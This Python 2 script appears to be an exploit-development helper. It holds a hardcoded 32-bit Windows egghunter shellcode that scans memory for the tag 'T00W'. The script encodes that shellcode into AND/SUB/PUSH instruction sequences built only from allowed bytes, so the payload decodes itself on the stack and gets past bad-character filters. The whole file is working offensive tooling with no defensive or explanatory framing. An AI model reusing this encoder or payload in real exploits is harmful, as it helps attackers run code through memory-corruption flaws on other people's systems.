good_shell = ""

good_chars = (
0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0b,0x0c,0x0e,0x0f,0x10,0x11,0x12,0x13,
0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0x21,0x22,0x23,0x24,
0x25,0x26,0x27,0x28,0x29,0x2a,0x2b,0x2c,0x2d,0x2e,0x30,0x31,0x32,0x33,0x34,0x35,0x36,
0x37,0x38,0x39,0x3b,0x3c,0x3d,0x3e,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,
0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a,0x5b,
0x5c,0x5d,0x5e,0x5f,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x6c,
0x6d,0x6e,0x6f,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7a,0x7b,0x7c,0x7d,
0x7e,0x7f
)

buf = ""
buf += r'\x66\x81\xca\xff\x0f\x42\x52\x6a'
buf += r'\x02\x58\xcd\x2e\x3c\x05\x5a\x74'
buf += r'\xef\xb8\x54\x30\x30\x57\x8b\xfa'
buf += r'\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

def get_lec2(word):
    reverse = (word[6] + word[7]) + (word[4] + word[5]) + (word[2] + word[3]) + (word[0] + word[1])
    c2 = 0xffffffff - int(reverse,16) + 1
    k = format(c2, '08x')
    print "[+] 4 bytes chunk %s" % (word)
    print "[+] little endian %s and c2 %s" % (reverse,k)
    return k

def get_index(search_byte):
    found_number = 0
    gc_start = 0
    gc_end = len(good_chars)-1
    index = None
    times_run = 0
    index = gc_start
    while (found_number == 0):
        times_run += 1
        if gc_start > gc_end:
            break
        if search_byte > good_chars[index]:
            gc_start += 1
            index = gc_end
        elif search_byte < good_chars[index]:
            gc_end -= 1
            index = gc_start
        else:
            found_number = 1
    return index

def get_two(cbyte):
    p1 = 0
    p2 = 0
    if cbyte > good_chars[-1]:
        p1 = -1
        need = cbyte - good_chars[p1]
        p2 = get_index(need)
    else:
        p1 = get_index(cbyte)
        if cbyte - good_chars[p1] < good_chars[0]:
            p1 -= 1
        need = cbyte - good_chars[p1]
        p2 = get_index(need)
    if good_chars[p1] + good_chars[p2] == cbyte:
        return (good_chars[p1],good_chars[p2])
    else:
        return (0xff,0x00)

def split_hex(k):
    hexcode = r'\x2d'
    for i in range (len(k),0,-2):
        hexcode += r'\x' + k[i-2:i]
    return hexcode

def get_three(cbyte, cf, of):
    p1 = 0
    p2 = 0
    p3 = 0
    if cf == 1:
        cbyte -= 0x01
    if of == 1:
        cbyte += 0x100
    if cbyte > good_chars[-1]:
        p1 = -1
    else:
        p1 = get_index(cbyte)
        if (cbyte - good_chars[p1]) < (good_chars[0]*2):
            p1 -= 2
    need = cbyte - good_chars[p1]
    (p2,p3) = get_two(need)
    if (good_chars[p1] + p2 + p3) == cbyte:
        return (good_chars[p1],p2,p3)
    else:
        return (0xff,0x00,0x00)

def calculate(k):
    global good_shell
    three_members = 0
    cf = [0,0,0,0]
    of = [0,0,0,0]
    bcount = 0

    for i in range (0, len(k)-1,2):
        x = k[i:i+2]
        if int(x,16) > (good_chars[-1]*2):
            three_members = 1
        if int(x,16) <= good_chars[0]:
            three_members = 1
            of[bcount] = 1
            if bcount > 0:
                cf[bcount-1] = 1
        bcount += 1

    if (three_members == 1):
        n1 = ""
        n2 = ""
        n3 = ""
        bcount = 3
        for i in range (len(k), 0, -2):
            x = k[i-2:i]
            (s1,s2,s3) = get_three(int(x,16),cf[bcount],of[bcount])
            n1 = ''.join((format(s1,'02x'),n1))
            n2 = ''.join((format(s2,'02x'),n2))
            n3 = ''.join((format(s3,'02x'),n3))
            bcount -= 1
        nsum = int(n1,16) + int(n2,16) + int(n3,16)
        if (int(k,16) == nsum) or ((int(k,16) + 0x100000000) == nsum):
            print "[+] Found valid values for %s" % (k)
            good_shell += r'\x25\x41\x41\x41\x41'
            good_shell += r'\x25\x36\x36\x36\x36'
            good_shell += split_hex(n3) + split_hex(n2) + split_hex(n1)
            good_shell += r'\x50'
            print "[.+] N1 = sub eax, %s" % (n1)
            print "[.+] N2 = sub eax, %s" % (n2)
            print "[.+] N3 = sub eax, %s" % (n3)
    else:
        n1 = ""
        n2 = ""
        for j in range (len(k)-1 , 0, -2):
            x = k[j-1:j+1]
            (s1,s2) = get_two(int(x,16))
            n1 = ''.join((format(s1,'02x'),n1))
            n2 = ''.join((format(s2,'02x'),n2))
        if int(k,16) == int(n1,16) + int(n2,16):
            good_shell += r'\x25\x41\x41\x41\x41'
            good_shell += r'\x25\x36\x36\x36\x36'
            good_shell += split_hex(n2) + split_hex(n1)
            good_shell += r'\x50'
            print "[+] Found valid values for %s" % (k)
            print "[.+] N1 = sub eax, %s" % (n1)
            print "[.+] N2 = sub eax, %s" % (n2)

if __name__ == '__main__':
    buf = buf.replace("\\x","")
    tbytes = len(buf)/2
    if (tbytes % 4) != 0:
        nm = (tbytes - 1 | 3) + 1
        padding = nm-tbytes
        buf += '90' * padding
    for i in range (len(buf), 0, -8):
        k = get_lec2(buf[i-8:i])
        calculate(k)
    size = good_shell.replace("\\x","")
    size = len(size)/2
    print "Encoded shellcode of %d bytes" % (size)
    print (good_shell)
